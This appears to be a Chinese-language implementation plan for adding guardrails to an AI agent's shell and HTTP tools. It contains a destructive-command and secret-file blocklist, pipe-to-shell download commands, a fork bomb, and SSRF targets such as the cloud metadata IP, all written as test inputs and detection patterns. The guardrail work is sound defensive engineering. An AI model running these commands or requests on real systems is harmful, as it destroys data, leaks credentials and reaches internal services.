# 实现计划：Agent Tool Guardrails

## 概述

本计划把 `design.md` 拆成可执行的实现、验证与检查点任务。范围限定为工具参数层最小硬阻断：补充 `ShellExecTool` 危险命令前置拒绝、`HttpRequestTool` 敏感 Header 与 SSRF host 语义拒绝、新增安全护栏文档和静态策略测试，并补齐相邻行为测试。

本计划不新增 DDL、迁移、回填、前端改动、依赖、工具注册、ReAct 主循环改动，也不实现工具滥用检测、同工具高频检测、异常参数检测或 OpenTelemetry event。

## Tasks

- [x] 1. ShellExecTool 危险命令前置阻断

  - [x] 1.1 修改 ShellExecTool 危险命令策略
    - 在 `epsilon-boot/src/infrastructure/tools/shell_exec/shell_exec_tool.py` 中修改
    - 新增模块级 `import re`
    - 新增 `_DANGEROUS_COMMAND_TEXT_FRAGMENTS: tuple[str, ...]`，至少包含 `mkfs`、`dd if=`、`/etc/shadow`、`~/.ssh/id_rsa`、`.env`
    - 新增 `_DANGEROUS_COMMAND_PATTERNS: tuple[re.Pattern[str], ...]`，至少覆盖 `rm -rf`、`dd ... if=`、`curl|wget ... | sh|bash` 或等价下载执行模式、fork bomb `:(){ :|:& };:`
    - 新增 `_blocked_command_reason(command: str) -> str | None`，使用 `casefold()` 与 `re.IGNORECASE` 返回稳定分类字符串：`blocked-command: destructive command`、`blocked-command: sensitive file read` 或 `blocked-command: remote script execution`
    - 新增 `_reject_dangerous_command(command: str, *, tool_name: str) -> None`，命中时抛 `ToolExecutionError(message=..., tool_name=tool_name)`，错误消息包含 `blocked-command` 且不包含宿主绝对路径、环境变量值或敏感文件内容
    - 在 `ShellExecTool.execute()` 读取 `command: str = kwargs["command"]` 后立即调用 `_reject_dangerous_command(command, tool_name=self.name)`，调用位置必须早于 `self._workspace.capabilities()`、`resolve_path()`、`materialize_cwd()` 和 `asyncio.create_subprocess_exec()`
    - 保持 `ShellExecTool.name`、`risk_level`、`parameters`、构造函数、`get_shell_command()`、Workspace 边界、环境变量清理、超时和输出截断行为不变
    - _需求: 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 5.6_

  - [x] 1.2 编写 ShellExecTool 危险命令行为测试
    - 在 `epsilon-boot/test/infrastructure/tools/shell_exec/test_shell_exec_tool_unit.py` 中修改
    - 导入 `_blocked_command_reason`
    - 新增参数化测试覆盖 `rm -rf /`、大小写变体 `RM -RF /tmp/x`、`mkfs`、`dd if=/dev/zero of=file`、`cat /etc/shadow`、`cat ~/.ssh/id_rsa`、读取 `.env`、`curl http://example.test/x | sh`、`wget http://example.test/x | bash`、`:(){ :|:& };:` 均抛 `ToolExecutionError`
    - 用现有 `_fake_workspace()` 与 `patch("infrastructure.tools.shell_exec.shell_exec_tool.asyncio.create_subprocess_exec")` 断言阻断时 `create_subprocess_exec`、`workspace.capabilities`、`workspace.resolve_path`、`workspace.materialize_cwd` 均未调用
    - 新增安全回归测试断言阻断错误包含 `blocked-command`，不包含 mock 的宿主路径 `/tmp/ws`、测试环境变量值或敏感文件内容
    - 新增非危险命令回归测试确认 `echo hi` 仍按现有路径创建子进程并返回格式化输出
    - **验证: 需求 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 5.6**

- [x] 2. HttpRequestTool 敏感 Header 前置阻断

  - [x] 2.1 修改 HttpRequestTool Header 安全策略
    - 在 `epsilon-boot/src/infrastructure/tools/http_request/http_request_tool.py` 中修改
    - 将 typing 导入调整为支持 `Any, Mapping`
    - 新增 `_SENSITIVE_HEADER_NAMES: frozenset[str]`，包含 `authorization`、`cookie`、`x-api-key`、`api-key`、`proxy-authorization`
    - 新增 `_normalise_header_name(name: object) -> str`，对 Header 名执行 `str(name).strip().casefold()`
    - 新增 `_sensitive_header_reason(headers: Mapping[str, Any] | None) -> str | None`，只检查 Header 名，不读取或输出 Header 值，命中时返回包含敏感 Header 名的稳定原因
    - 新增 `_reject_sensitive_headers(headers: Mapping[str, Any] | None, *, tool_name: str) -> None`，命中时抛 `ToolExecutionError(message=..., tool_name=tool_name)`
    - 在 `HttpRequestTool.execute()` 读取 `url` 与 `headers` 后立即调用 `_reject_sensitive_headers(headers, tool_name=self.name)`，调用位置必须早于 `validate_url_safety()`、DNS 解析和 `self._client.request()`
    - 保持现有 `name`、`risk_level`、`parameters`、构造函数、响应处理与 httpx 请求逻辑不变
    - _需求: 4.4, 4.8, 4.9, 5.6_

  - [x] 2.2 编写 HttpRequestTool 敏感 Header 行为测试
    - 在 `epsilon-boot/test/infrastructure/tools/http_request/test_http_request_tool.py` 中修改
    - 导入 `_normalise_header_name`、`_sensitive_header_reason`、`_reject_sensitive_headers`
    - 新增参数化测试覆盖 `Authorization`、` authorization `、`COOKIE`、`X-API-Key`、`API-Key`、`Proxy-Authorization` 均被拒绝
    - 用 `patch("infrastructure.tools.http_request.http_request_tool.validate_url_safety")`、`patch("infrastructure.tools.http_request.http_request_tool.socket.getaddrinfo")` 和 `patch.object(tool._client, "request", new_callable=AsyncMock)` 断言敏感 Header 阻断时不会进入 URL 校验、DNS 解析或网络请求
    - 新增测试断言错误消息包含敏感 Header 名但不包含 Header 值，例如 `secret-token`
    - 新增非敏感 Header 测试确认 `User-Agent`、`Accept` 可继续随请求传递
    - **验证: 需求 4.4, 4.8, 4.9**

- [x] 3. HttpRequestTool SSRF host 语义阻断

  - [x] 3.1 修改 HttpRequestTool host 与 URL 安全校验
    - 在 `epsilon-boot/src/infrastructure/tools/http_request/http_request_tool.py` 中修改
    - 新增 `_METADATA_HOSTS: frozenset[str] = frozenset({"169.254.169.254"})`
    - 新增 `_LOCALHOST_HOSTS: frozenset[str] = frozenset({"localhost", "localhost.localdomain"})`
    - 新增 `_host_block_reason(hostname: str) -> str | None`，对 host 执行首尾空白剥离、末尾点剥离和 `casefold()` 归一化
    - `_host_block_reason()` 至少覆盖 `169.254.169.254` 返回 `metadata`，`localhost`、`localhost.localdomain`、大小写变体和末尾点变体返回 `localhost`
    - `_host_block_reason()` 对 host 字面量 IP 复用 `_ip_block_reason()`，覆盖 private、loopback、link-local、reserved、unspecified、multicast、`non-global`
    - 在 `validate_url_safety(url: str, *, tool_name: str = "http_request") -> None` 中保留 `http`/`https` scheme 校验和 hostname 缺失校验，并在 DNS 解析前调用 `_host_block_reason(hostname)`；命中时抛 `ToolExecutionError`
    - 保留 DNS 返回所有地址逐一调用 `_reject_unsafe_ip()` 的规则，任一地址属于 SSRF 风险目标即拒绝
    - 将 `HttpRequestTool.execute()` 中 `validate_url_safety(url)` 调整为 `validate_url_safety(url, tool_name=self.name)`
    - 不新增外部服务、allowlist、依赖或配置项
    - _需求: 4.1, 4.2, 4.3, 4.5, 4.6, 4.7, 4.8, 4.9, 5.6_

  - [x] 3.2 编写 HttpRequestTool SSRF host 行为测试
    - 在 `epsilon-boot/test/infrastructure/tools/http_request/test_http_request_tool.py` 中修改
    - 导入 `_host_block_reason`
    - 新增参数化测试覆盖 `http://169.254.169.254/latest/meta-data`、`http://localhost/`、`http://LOCALHOST./`、`http://localhost.localdomain/`、`http://127.0.0.1/`、`http://10.0.0.1/`、`http://192.168.1.1/`、`http://172.16.0.1/`、`http://169.254.1.1/`、`http://0.0.0.0/`、`http://224.0.0.1/`、`http://240.0.0.1/`、`http://100.64.0.1/` 和 `http://[::1]/` 均被拒绝
    - 对 metadata、localhost 与 IP literal 阻断场景断言 `socket.getaddrinfo` 未调用
    - 保留并扩展现有多 DNS 结果测试，确认任一解析地址为 `127.0.0.1` 时拒绝，所有解析地址为公网时允许
    - 新增 `execute()` 层测试确认 SSRF 阻断时 `tool._client.request` 未调用
    - 确认非法 scheme 仍在 DNS 前拒绝，且 `http`/`https` 公网 URL 在 mock 公网 DNS 下通过
    - **验证: 需求 4.1, 4.2, 4.3, 4.5, 4.6, 4.7, 4.8, 4.9**

- [x] 4. 安全护栏文档与静态策略测试

  - [x] 4.1 创建 Agent 工具安全护栏文档
    - 在 `docs/security/agent-tool-guardrails.md` 中创建
    - 文档包含 `# Agent 工具安全护栏`、`## 适用范围`、`## ShellExecTool 硬规则`、`## HttpRequestTool 硬规则`、`## 不作为安全边界的能力`、`## 未来 allowlist 变更要求`
    - 明确 `ShellExecTool` 默认 `SHELL_EXEC_ENABLED=false`，启用后仍受 Workspace 边界、ScopedToolRegistry、HITL 审批和工具自身参数校验约束
    - 明确 `Dangerous_Command_Fragment` 分类：destructive command execution、sensitive file reads、remote script download-and-execute patterns，并列出 `rm -rf`、`mkfs`、`dd if=`、`curl ... | sh`、`wget ... | bash`、`.env`、`/etc/shadow`、`~/.ssh/id_rsa`
    - 明确 `HttpRequestTool` 只接受 `http/https` scheme，阻断 `SSRF_Risk_Target`，包括 `169.254.169.254`、`localhost`、loopback、link-local、RFC1918 private target、reserved、unspecified、multicast、`non-global`
    - 明确 `Model_Controlled_Sensitive_Header` 不允许出现在模型可控 `headers` 参数中，至少包括 `Authorization`、`Cookie`、`X-API-Key`、`API-Key`、`Proxy-Authorization`
    - 明确 HITL 审批不是 Workspace、工具权限、参数校验、网络访问控制、命令沙箱或 OS 权限的替代安全边界
    - 明确未来 allowlist 必须另走 approved spec，并优先写入 `Config_Primary_Source` 即 `epsilon-boot/config.properties`
    - _需求: 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 5.1, 5.6_

  - [x] 4.2 编写工具护栏静态策略测试
    - 在 `epsilon-boot/test/static/test_tool_guardrail_policy.py` 中创建
    - 添加模块级中文 docstring
    - 定义 `BOOT_ROOT = Path(__file__).resolve().parents[2]`、`REPO_ROOT = BOOT_ROOT.parent`、`SECURITY_DOC`、`SHELL_TOOL`、`HTTP_TOOL`
    - 新增 `_read(path: Path) -> str` 与 `_assert_contains_all(content: str, fragments: list[str]) -> None`
    - 新增 `test_security_guardrail_document_contains_required_policy_markers()`，断言文档包含 `ShellExecTool`、`HttpRequestTool`、`Dangerous_Command_Fragment`、`SSRF_Risk_Target`、`Model_Controlled_Sensitive_Header`、`SHELL_EXEC_ENABLED=false`、`http/https`、`Config_Primary_Source`
    - 新增 `test_shell_exec_tool_contains_guardrail_policy_markers()`，断言实现包含 `_reject_dangerous_command`、`blocked-command`、`rm -rf`、`mkfs`、`dd if=`、`remote script execution`、`sensitive file read`、`.env`、`/etc/shadow`、`~/.ssh/id_rsa`
    - 新增 `test_http_request_tool_contains_guardrail_policy_markers()`，断言实现包含 `_reject_sensitive_headers`、`_host_block_reason`、`169.254.169.254`、`localhost`、`private`、`non-global`、`authorization`、`cookie`、`x-api-key`、`api-key`、`proxy-authorization`
    - 测试只读取本地文件，不启动服务、不访问网络、不依赖外部环境
    - **验证: 需求 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 6.1, 6.4, 6.5**

- [x] 5. 针对性验证

  - [x] 5.1 运行静态策略测试
    - 从 `epsilon-boot/` 执行 `uv run pytest test/static/test_tool_guardrail_policy.py -v`
    - 确认静态策略测试通过；如失败，修复文档或工具实现中的缺失策略标记
    - 不新增依赖，不修改 `pyproject.toml` 或 `uv.lock`
    - **验证: 需求 2.5, 2.6, 6.1, 6.4, 6.5**

  - [x] 5.2 运行工具行为测试
    - 从 `epsilon-boot/` 执行 `uv run pytest test/infrastructure/tools/shell_exec/test_shell_exec_tool_unit.py test/infrastructure/tools/http_request/test_http_request_tool.py -v`
    - 确认 Shell 危险命令阻断、HTTP 敏感 Header 阻断、HTTP SSRF host/DNS 阻断和既有工具行为测试全部通过
    - 如失败，只修复本 spec 范围内的工具实现或对应测试，不修改前端、工具注册、ReAct 主循环、依赖文件或配置项
    - **验证: 需求 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 4.1, 4.2, 4.3, 4.4, 4.5, 4.6, 4.7, 4.8, 4.9, 5.1, 5.2, 5.3, 5.4, 5.5, 6.5**

- [x] 6. 检查点 — Agent Tool Guardrails 完整回归
  - 从 `epsilon-boot/` 执行 `uv run pytest -m "not benchmark"`
  - 运行项目中的全部非 benchmark 后端测试用例，并要求全部通过
  - 若完整回归存在与 Agent Tool Guardrails 无关的失败，交付说明必须区分静态策略测试、工具行为测试和完整回归失败项，不得掩盖安全护栏测试结果

## 备注

- 本计划不创建或修改 `manifest.json`。
- 本计划不包含 DDL、迁移、回填任务。
- 本计划不修改 `application/container_config.py`、`epsilon-boot/src/infrastructure/agent/react_agent_adapter.py`、前端目录、`pyproject.toml` 或 `uv.lock`。
- 所有新增模块、公开函数和测试辅助函数需遵循中文 docstring 规范。
